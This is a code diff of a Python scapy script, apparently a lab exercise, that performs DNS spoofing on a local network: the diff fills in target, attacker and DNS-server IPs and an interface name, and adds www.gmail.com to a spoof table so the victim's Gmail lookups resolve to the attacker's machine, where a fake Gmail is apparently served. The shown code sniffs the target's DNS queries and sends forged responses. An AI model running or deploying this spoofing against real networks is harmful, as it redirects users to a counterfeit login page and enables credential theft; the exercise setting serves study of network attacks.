@@ -7,19 +7,18 @@ import time
 
 from scapy.sendrecv import srp
 
-DOOFENSHMIRTZ_IP = "???"  # Enter the computer you attack's IP.
-SECRATERY_IP = "???"  # Enter the attacker's IP.
-NETWORK_DNS_SERVER_IP = "???"  # Enter the network's DNS server's IP.
+DOOFENSHMIRTZ_IP = "10.0.2.4"  # Enter the computer you attack's IP.
+SECRATERY_IP = "10.0.2.15"  # Enter the attacker's IP.
+NETWORK_DNS_SERVER_IP = "10.0.2.43"  # Enter the network's DNS server's IP.
 SPOOF_SLEEP_TIME = 2
-REAL_IP = "172.20.10.2"
 
-IFACE = "???"  # Enter the network interface you work on.
+IFACE = "enp0s3"  # Enter the network interface you work on.
 
 FAKE_GMAIL_IP = SECRATERY_IP  # The ip on which we run
 DNS_FILTER = f"udp port 53 and ip src {DOOFENSHMIRTZ_IP} and ip dst {NETWORK_DNS_SERVER_IP}"  # Scapy filter
 REAL_DNS_SERVER_IP = "8.8.8.8"  # The server we use to get real DNS responses.
 SPOOF_DICT = {  # This dictionary tells us which host names our DNS server needs to fake, and which ips should it give.
-    b"???": FAKE_GMAIL_IP
+    b"www.gmail.com": FAKE_GMAIL_IP
 }
 
 
@@ -147,7 +146,7 @@ class DnsHandler(object):
         @param pkt DNS request from target.
         @return string describing the choice made
         """
-        #print(pkt.show())
+        # print(pkt.show())
         if pkt[DNSQR].qname in self.spoof_dict:
             choice = "get_spoofed_dns_response"
             pkt_to_send = self.get_spoofed_dns_response(pkt, self.spoof_dict[pkt[DNSQR].qname])
@@ -158,8 +157,7 @@ class DnsHandler(object):
         scapy.send(pkt_to_send, iface=IFACE)
         return choice
 
-
-def run(self) -> None:
+    def run(self) -> None:
         """
         Main loop of the process. Sniffs for packets on the interface and sends DNS
         requests to resolve_packet. For every packet which passes the filter, self.resolve_packet
